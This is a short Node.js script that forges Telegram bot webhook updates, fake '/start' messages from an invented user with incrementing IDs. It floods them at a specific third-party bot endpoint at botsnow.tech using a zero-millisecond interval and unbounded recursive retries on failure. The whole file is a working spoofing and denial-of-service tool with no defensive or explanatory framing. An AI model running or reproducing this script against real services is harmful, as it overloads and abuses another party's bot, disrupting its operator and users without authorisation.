const axios = require("axios");

let updateId = 8282828; // initial value

let messageId = 90; // initial value

let fromId = 292992929; // initial value

let chatId = 828272; // initial value
const sendRequest = async (url) => {

try {

    updateId++; // increment update_id

    messageId++; // increment message_id

    fromId++; // increment from.id

    chatId++; // increment chat.id

    const jom = {

      "update_id": updateId,

      "message": {

        "message_id": messageId,

        "from": {

          "id": fromId,

          "is_bot": false,

          "first_name": "soonban",

          "username": "soonban",

          "language_code": "en"

        },

        "chat": {

          "id": 5964643885,

          "first_name": "soonban",

          "username": "",

          "type": "private"

        },

        "date": new Date().getTime(),

        "text": "/start",

        "entities": [

          {

            "offset": 0,

            "length": 6,

            "type": "bot_command"

          }]

      }

    };

    const response = await axios.post(url, jom);

    console.log("Request successful!");

    console.log(response.data);

  } catch (error) {

    console.error("Request failed, retrying...");

    await sendRequest(url);

  }

};

const url = "https://botsnow.tech/v1/bots/3917/index.php";

setInterval(() => {

  sendRequest(url);

},0); //
